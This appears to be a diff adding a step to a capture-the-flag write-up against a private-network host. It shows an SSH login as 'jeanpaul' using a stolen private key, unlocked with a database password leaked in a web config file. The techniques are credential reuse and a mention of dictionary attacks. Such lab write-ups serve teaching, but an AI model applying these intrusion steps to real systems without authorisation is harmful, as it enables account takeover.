@@ -280,3 +280,49 @@ jp@192.168.64.6's password:
 
 
 ```
+
+We learned from exploiting the 8080 and 80 that the user is jean paul now lets use the id_rsa to login
+
+```
+┌──(root㉿kali)-[/mnt/dev]
+└─# ssh -i id_rsa jeanpaul@192.168.64.6
+Enter passphrase for key 'id_rsa': 
+```
+
+
+However, the id_rsas needs a passphrase, let's use the password that we saw while we exploit the port 80. We found the password in /app web directory config.yml
+
+Can't use dictionary attack as there is no I_love_java there
+
+We can dictionary attack with list of password using the /usr/share/dirbuster/wordlists/rockyou.txt but there is no word like I_love_java there 
+
+we can check `cat /usr/share/wordlists/rockyou.txt | grep I_love_java`
+
+```
+database:
+    driver: sqlite
+    databasename: bolt
+    username: bolt
+    password: I_love_java
+```
+
+We exploited the user jeanpaul using `I_love_java`
+
+```
+┌──(root㉿kali)-[/mnt/dev]
+└─# ssh -i id_rsa jeanpaul@192.168.64.6
+Enter passphrase for key 'id_rsa': 
+Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
+jeanpaul@dev:~$ 
+
+```
+
+
